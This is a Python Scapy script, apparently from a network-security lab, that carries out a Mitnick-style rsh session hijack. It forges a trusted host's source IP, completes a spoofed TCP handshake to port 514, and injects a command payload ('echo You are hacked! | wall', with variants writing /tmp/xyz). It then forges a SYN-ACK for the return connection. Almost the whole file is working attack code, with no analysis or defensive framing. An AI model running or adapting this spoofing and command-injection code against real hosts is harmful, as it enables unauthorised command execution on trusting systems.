from scapy.all import *

def send_syn_packet(src_ip, dst_ip, src_port, dst_port):
    # Create IP layer with spoofed source IP
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create SYN packet
    syn_packet = ip_layer/TCP(sport=src_port, dport=dst_port, flags="S", seq=1000)

    # Send SYN packet
    send(syn_packet, verbose=0)
    print(f"Sent SYN packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

def sniff_syn_ack(src_ip, dst_ip):
    # Sniff for SYN-ACK response
    print("Sniffing for SYN-ACK...")
    def packet_callback(packet):
        return (packet[IP].src == dst_ip and packet[IP].dst == src_ip and packet[TCP].flags == "SA")

    syn_ack_packet = sniff(filter=f"tcp and src {dst_ip} and dst {src_ip}", prn=packet_callback, count=1)
    return syn_ack_packet[0]

def send_ack_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num):
    # Create IP layer with spoofed source IP
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create ACK packet to complete the handshake
    ack_packet = ip_layer/TCP(sport=src_port, dport=dst_port, flags="A", seq=seq_num, ack=ack_num)

    # Send ACK packet
    send(ack_packet, verbose=0)
    print(f"Sent ACK packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

def send_custom_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num, payload):
    # Create IP layer with spoofed source IP
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create TCP packet with custom data
    tcp_packet = ip_layer/TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / payload

    # Send the packet
    send(tcp_packet, verbose=0)
    print(f"Sent custom data packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with payload: {payload}")

def sniff_syn_and_respond(src_ip, dst_ip, response_src_port, response_dst_port):
    # Sniff for SYN packet
    print("Sniffing for SYN packet...")
    def packet_callback(packet):
        if (packet[IP].src == dst_ip and packet[IP].dst == src_ip and packet[TCP].flags == "S"):
            # Respond with SYN-ACK
            seq_num = 1000
            ack_num = packet[TCP].seq + 1
            ip_layer = IP(src=src_ip, dst=dst_ip)
            syn_ack_packet = ip_layer/TCP(sport=response_src_port, dport=response_dst_port, flags="SA", seq=seq_num, ack=ack_num)
            send(syn_ack_packet, verbose=0)
            print(f"Sent SYN-ACK in response to SYN from {dst_ip}:{packet[TCP].sport}")
    
    sniff(filter=f"tcp and src {dst_ip}", prn=packet_callback, count=1)

# Define variables
source_ip = "10.0.2.4"  # Spoofed IP
destination_ip = "10.0.2.5"

# Ports for the first three packets
source_port_first = 1023
destination_port_first = 514

# Ports for the custom data packet (4th packet)
source_port_second = 9090
destination_port_second = 1023

# Send SYN packet
send_syn_packet(source_ip, destination_ip, source_port_first, destination_port_first)

# Sniff SYN-ACK packet
syn_ack = sniff_syn_ack(source_ip, destination_ip)
ack_number = syn_ack[TCP].seq + 1
sequence_number = syn_ack[TCP].ack

# Send ACK packet to complete handshake
send_ack_packet(source_ip, destination_ip, source_port_first, destination_port_first, sequence_number, ack_number)

# Define TCP data to be sent in the 4th packet
# tcp_payload = b"9090\x00seed\x00seed\x00touch /tmp/xyz\x00"
tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' | wall\x00"
# tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' > /tmp/xyz\x00"

# Send custom TCP data packet
send_custom_packet(source_ip, destination_ip, source_port_first, destination_port_first, sequence_number, ack_number, tcp_payload)

# Sniff the network and respond to a SYN packet with a SYN-ACK packet (using the same source IP but configurable ports)
sniff_syn_and_respond(source_ip, destination_ip, source_port_second, destination_port_second)

